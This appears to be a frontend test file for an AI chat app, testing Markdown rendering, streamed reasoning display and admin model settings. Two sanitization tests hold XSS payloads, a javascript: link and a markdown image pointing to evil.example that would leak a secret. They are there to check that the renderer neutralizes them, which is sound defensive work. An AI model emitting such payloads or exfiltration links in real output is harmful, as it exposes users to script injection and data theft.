import { describe, it, expect, vi } from 'vitest';
import { render, screen, within, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { ThemeProvider } from '@mui/material/styles';
import Markdown from '../src/components/Markdown.jsx';
import ThinkingBlock from '../src/components/ThinkingBlock.jsx';
import AgentPanel from '../src/components/AgentPanel.jsx';
import Chat from '../src/pages/Chat.jsx';
import Servers from '../src/pages/admin/Servers.jsx';
import { buildTheme, DEFAULT_BRANDING } from '../src/theme.js';
import { renderApp, userWith, ALL, ADMIN } from './helpers.jsx';

const md = (text) => render(<ThemeProvider theme={buildTheme(DEFAULT_BRANDING)}><Markdown>{text}</Markdown></ThemeProvider>);
const sse = (...evs) => new Response(evs.map((e) => `data: ${JSON.stringify(e)}\n\n`).join(''), { headers: { 'content-type': 'text/event-stream' } });

describe('Markdown rendering of model output', () => {
  it('renders headings, emphasis, lists, blockquotes, inline code, and links', () => {
    md('# Title\n\nSome **bold** and *italic* with `inline()` code.\n\n- one\n- two\n\n1. first\n2. second\n\n> quoted\n\n[docs](https://example.com/x)');
    expect(screen.getByRole('heading', { name: 'Title', level: 1 })).toBeInTheDocument();
    expect(screen.getByText('bold').tagName).toBe('STRONG'); expect(screen.getByText('italic').tagName).toBe('EM');
    expect(screen.getByText('inline()').tagName).toBe('CODE');
    expect(screen.getAllByRole('listitem').map((l) => l.textContent)).toEqual(['one', 'two', 'first', 'second']);
    expect(screen.getByText('quoted').closest('blockquote')).toBeTruthy();
    const a = screen.getByRole('link', { name: 'docs' });
    expect(a).toHaveAttribute('href', 'https://example.com/x'); expect(a).toHaveAttribute('target', '_blank'); expect(a.getAttribute('rel')).toMatch(/noopener/);
  });
  it('renders GitHub-flavored tables, task lists, and strikethrough', () => {
    md('| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo\n\n~~gone~~');
    expect(screen.getByRole('table')).toBeInTheDocument(); expect(screen.getByRole('columnheader', { name: 'a' })).toBeInTheDocument(); expect(screen.getByRole('cell', { name: '2' })).toBeInTheDocument();
    expect(screen.getAllByRole('checkbox')).toHaveLength(2);
    expect(screen.getByText('gone').tagName).toBe('DEL');
  });
  it('renders fenced code with the language label, syntax highlighting, and a working copy button', async () => {
    const writeText = vi.fn().mockResolvedValue(); Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
    const { container } = md('```js\nconst x = 1;\nconsole.log("hi");\n```');
    const block = screen.getByTestId('code-block');
    expect(within(block).getByText('js')).toBeInTheDocument();
    expect(container.querySelector('.hljs-keyword')).toHaveTextContent('const'); // highlighted
    await userEvent.click(within(block).getByRole('button', { name: 'Copy code' }));
    expect(writeText).toHaveBeenCalledWith('const x = 1;\nconsole.log("hi");');
  });
  it('renders an unknown language and an unterminated (still streaming) fence without crashing', () => {
    md('```nosuchlang\nplain text\n```\n\n```python\nprint(1)\n'); // second fence never closes, as mid-stream
    expect(screen.getAllByTestId('code-block')).toHaveLength(2);
    expect(screen.getByText('plain text')).toBeInTheDocument(); expect(screen.getByText(/print/)).toBeInTheDocument();
  });
  it('does NOT execute or render raw HTML from the model (escaped as text)', () => {
    const { container } = md('Hello <script>window.__pwned = 1</script> <img src=x onerror="window.__pwned=1"> <b>not bold</b>\n\n<iframe src="https://evil.example"></iframe>');
    expect(container.querySelector('script, iframe, b')).toBeNull(); expect(container.querySelector('img')).toBeNull();
    expect(window.__pwned).toBeUndefined();
  });
  it('neutralizes dangerous links and never loads remote images (exfiltration channel)', () => {
    const { container } = md('[click](javascript:alert(1)) [data](data:text/html;base64,AAAA) [ok](mailto:a@b.co)\n\n![tracker](https://evil.example/leak?d=SECRET)');
    expect(screen.queryByRole('link', { name: 'click' })).toBeNull(); expect(screen.queryByRole('link', { name: 'data' })).toBeNull();
    expect(screen.getByText('click')).toBeInTheDocument(); // text kept, link removed
    expect(screen.getByRole('link', { name: 'ok' })).toHaveAttribute('href', 'mailto:a@b.co');
    expect(container.querySelector('img')).toBeNull(); expect(screen.getByText(/\[image: tracker\]/)).toBeInTheDocument();
  });
  it('handles empty input', () => { const { container } = md(undefined); expect(container.textContent).toBe(''); });
});

describe('ThinkingBlock', () => {
  it('is open with a live indicator while thinking, then collapses (and can be toggled)', async () => {
    const { rerender } = render(<ThinkingBlock text="step one" live />);
    expect(screen.getByRole('button', { name: 'Thinking' })).toHaveAttribute('aria-expanded', 'true');
    expect(screen.getByText('Thinking…')).toBeInTheDocument(); expect(screen.getByText('step one')).toBeVisible();
    rerender(<ThinkingBlock text="step one and two" live={false} />);
    const btn = screen.getByRole('button', { name: 'Thought process' });
    await waitFor(() => expect(btn).toHaveAttribute('aria-expanded', 'false'));
    await userEvent.click(btn);
    expect(screen.getByText('step one and two')).toBeVisible();
  });
  it('shows an estimated token count below the thought, counting up while it streams', () => {
    const { rerender } = render(<ThinkingBlock text={'x'.repeat(40)} live />);
    expect(screen.getByTestId('thinking-tokens')).toHaveTextContent('~10 tokens so far');
    rerender(<ThinkingBlock text={'x'.repeat(4000)} live={false} />);
    expect(screen.getByTestId('thinking-tokens')).toHaveTextContent('~1.0k tokens');
    expect(screen.getByTestId('thinking-tokens')).not.toHaveTextContent('so far');
  });
  it('renders nothing when the reasoning is only whitespace', () => { const { container } = render(<ThinkingBlock text={'\n'} live={false} />); expect(container.textContent).toBe(''); });
  it('renders nothing when the model produced no reasoning', () => { const { container } = render(<ThinkingBlock text="" live />); expect(container.textContent).toBe(''); });
  it('keeps a user-chosen state while streaming continues', async () => {
    render(<ThinkingBlock text="abc" live />);
    await userEvent.click(screen.getByRole('button', { name: 'Thinking' }));
    expect(screen.getByRole('button', { name: 'Thinking' })).toHaveAttribute('aria-expanded', 'false');
  });
});

describe('streamed thinking in the agent panel', () => {
  const routes = (turn) => ({ '/api/models': { models: [{ id: 1, label: 'Fake', provider: 'p' }], defaults: {} }, 'POST /api/agent/turn': turn });
  it('shows reasoning as it streams, then the Markdown answer, with the reasoning collapsed afterwards', async () => {
    let release; const gate = new Promise((r) => { release = r; });
    const turn = async () => {
      const enc = new TextEncoder();
      const body = new ReadableStream({ async start(c) {
        const send = (e) => c.enqueue(enc.encode(`data: ${JSON.stringify(e)}\n\n`));
        send({ type: 'start', conversationId: 1 }); send({ type: 'thinking', text: 'Weighing ' }); send({ type: 'thinking', text: 'the options' });
        await gate;
        send({ type: 'text', text: 'Use **Postgres**:\n\n```sql\nSELECT 1;\n```' }); send({ type: 'done' }); c.close();
      } });
      return new Response(body, { headers: { 'content-type': 'text/event-stream' } });
    };
    renderApp(<AgentPanel project={{ id: 1 }} />, { user: userWith(ALL), routes: routes(turn) });
    await userEvent.type(await screen.findByLabelText('Message'), 'which db?');
    await userEvent.click(screen.getByRole('button', { name: 'Send' }));
    // mid-stream: reasoning is visible and live, no answer yet
    expect(await screen.findByText('Weighing the options')).toBeVisible();
    expect(screen.getByText('Thinking…')).toBeInTheDocument();
    release();
    // answer arrives rendered as Markdown; reasoning stops being live and collapses
    expect(await screen.findByText('Postgres')).toHaveProperty('tagName', 'STRONG');
    expect(screen.getByTestId('code-block')).toBeInTheDocument();
    const toggle = await screen.findByRole('button', { name: 'Thought process' });
    await waitFor(() => expect(toggle).toHaveAttribute('aria-expanded', 'false'));
    expect(screen.queryByText('Thinking…')).toBeNull();
  });
  it('renders the proposed plan as Markdown', async () => {
    renderApp(<AgentPanel project={{ id: 1 }} />, { user: userWith(ALL), routes: routes(() => sse({ type: 'start', conversationId: 1 }, { type: 'plan', plan: '## Steps\n\n1. **Add** a route' }, { type: 'done' })) });
    await userEvent.type(await screen.findByLabelText('Message'), 'plan it');
    await userEvent.click(screen.getByRole('button', { name: 'Send' }));
    expect(await screen.findByRole('heading', { name: 'Steps' })).toBeInTheDocument();
    expect(screen.getByText('Add').tagName).toBe('STRONG');
  });
});

describe('chat page', () => {
  it('streams thinking and renders the answer as Markdown', async () => {
    const turn = () => sse({ type: 'start', conversationId: 3 }, { type: 'thinking', text: 'Hmm, a haiku.' }, { type: 'text', text: '- *old pond*\n- frog jumps in' }, { type: 'done' });
    renderApp(<Chat />, { user: userWith(ALL), routes: { '/api/models': { models: [{ id: 1, label: 'Fake' }], defaults: {} }, '/api/conversations': [], 'POST /api/chat/turn': turn } });
    await userEvent.type(await screen.findByLabelText('Message'), 'haiku');
    await userEvent.click(screen.getByRole('button', { name: 'Send' }));
    expect(await screen.findByText('old pond')).toHaveProperty('tagName', 'EM');
    expect(screen.getAllByRole('listitem')).toHaveLength(2);
    expect(await screen.findByRole('button', { name: 'Thought process' })).toBeInTheDocument();
  });
  it('restores saved reasoning when reopening a conversation', async () => {
    renderApp(<Chat />, { user: userWith(ALL), routes: { '/api/models': { models: [], defaults: {} }, '/api/conversations': [{ id: 7, title: 'Old chat' }],
      '/api/conversations/7/messages': [{ role: 'user', content: 'q' }, { role: 'assistant', content: 'Answer **here**', thinking: 'earlier reasoning' }] } });
    await userEvent.click(await screen.findByText('Old chat'));
    expect(await screen.findByText('here')).toHaveProperty('tagName', 'STRONG');
    await userEvent.click(await screen.findByRole('button', { name: 'Thought process' }));
    expect(screen.getByText('earlier reasoning')).toBeVisible();
  });
});

describe('admin: model dialog', () => {
  const provider = { id: 4, name: 'Anthropic', type: 'anthropic', enabled: true, hasSecret: true, config: {}, allowedRoles: [],
    models: [{ id: 11, modelId: 'claude-opus-5-5', label: 'Opus', enabled: true, maxTokens: 4096, temperature: 0.3, thinkingMode: 'adaptive', thinkingBudget: null, subagents: true, fileUploads: null, imageUploads: null, contextSize: 200000, inputPrice: 5, outputPrice: 25, helpText: 'Quick edits.' },
      { id: 12, modelId: 'claude-haiku-4-5', label: 'Haiku', enabled: false, maxTokens: 4096, thinkingMode: 'budget', thinkingBudget: 8000 }] };
  const routes = { '/api/admin/providers': [provider], '/api/admin/roles': { roles: [], groupMap: [] }, '/api/models': { models: [], defaults: { plan: 11, act: 12, chat: null } },
    'POST /api/admin/providers/4/models': provider, 'PUT /api/admin/default-models': {} };
  it('keeps the list compact: name, id, a details summary, and defaults, with Edit and Remove', async () => {
    renderApp(<Servers />, { user: userWith(ADMIN), routes });
    const row = (await screen.findByText('Opus')).closest('tr');
    expect(row).toHaveTextContent('claude-opus-5-5'); expect(row).toHaveTextContent(/200,000 context/); expect(row).toHaveTextContent(/Thinking: Adaptive/); expect(row).toHaveTextContent('plan');
    expect(screen.getByText('Haiku').closest('tr')).toHaveTextContent('Disabled');
    expect(screen.queryByLabelText(/Thinking for/)).toBeNull();
  });
  it('edits every setting in the dialog and saves them in one request, including the defaults', async () => {
    const { fetch } = renderApp(<Servers />, { user: userWith(ADMIN), routes });
    await userEvent.click(await screen.findByRole('button', { name: 'Edit Opus' }));
    const dlg = await screen.findByRole('dialog');
    expect(within(dlg).getByLabelText(/Help text for users/)).toHaveValue('Quick edits.');
    expect(within(dlg).getByLabelText(/Context window/)).toHaveValue(200000);
    const price = within(dlg).getByLabelText(/Input price/); await userEvent.clear(price); await userEvent.type(price, '6');
    await userEvent.click(within(dlg).getByLabelText(/Images/)); await userEvent.click(await screen.findByRole('option', { name: 'On' })); // override the connection's setting
    await userEvent.click(within(dlg).getByLabelText('Chat'));
    await userEvent.click(within(dlg).getByLabelText('Plan')); // was the Plan default: switch it off
    await userEvent.click(within(dlg).getByRole('button', { name: 'Save' }));
    await waitFor(() => expect(fetch.calls.some((c) => c.method === 'PUT' && c.url === '/api/admin/default-models')).toBe(true));
    expect(fetch.calls.find((c) => c.url.endsWith('/models') && c.method === 'POST').body).toMatchObject({ modelId: 'claude-opus-5-5', label: 'Opus', enabled: true, fileUploads: null, imageUploads: true, subagents: true, contextSize: 200000, inputPrice: 6, outputPrice: 25, thinkingMode: 'adaptive', maxTokens: 4096, temperature: 0.3, helpText: 'Quick edits.' });
    expect(fetch.calls.find((c) => c.url === '/api/admin/default-models').body).toEqual({ plan: null, act: 12, chat: 11 });
  });
  it('shows the thinking budget field only for Budget mode', async () => {
    renderApp(<Servers />, { user: userWith(ADMIN), routes });
    await userEvent.click(await screen.findByRole('button', { name: 'Edit Haiku' }));
    expect(await screen.findByLabelText(/Thinking budget/)).toHaveValue(8000);
  });
  it('is read-only without provider.write', async () => {
    renderApp(<Servers />, { user: userWith([...ALL, 'provider.read']), routes });
    await screen.findByText('Opus');
    expect(screen.queryByRole('button', { name: 'Edit Opus' })).toBeNull();
  });
});

describe('admin: provider help text', () => {
  const provider = { id: 4, name: 'Anthropic', type: 'anthropic', enabled: true, hasSecret: true, config: {}, allowedRoles: [], helpText: 'Good for hard problems.', models: [] };
  const routes = { '/api/admin/providers': [provider], '/api/admin/roles': { roles: [], groupMap: [] }, '/api/models': { models: [], defaults: {} }, 'PUT /api/admin/providers/4': provider, 'POST /api/admin/providers/discover': { ok: true, models: [] } };
  it('shows the help text on the card and saves an edit with the connection', async () => {
    const { fetch } = renderApp(<Servers />, { user: userWith(ADMIN), routes });
    expect(await screen.findByText('Good for hard problems.')).toBeInTheDocument();
    await userEvent.click(screen.getByRole('button', { name: 'Edit' }));
    const box = await screen.findByLabelText(/Help text for users/);
    expect(box).toHaveValue('Good for hard problems.');
    await userEvent.clear(box); await userEvent.type(box, 'Use for code review.');
    await userEvent.click(screen.getByRole('button', { name: 'Save' }));
    await waitFor(() => expect(fetch.calls.find((c) => c.method === 'PUT' && c.url === '/api/admin/providers/4')?.body.helpText).toBe('Use for code review.'));
  });
});
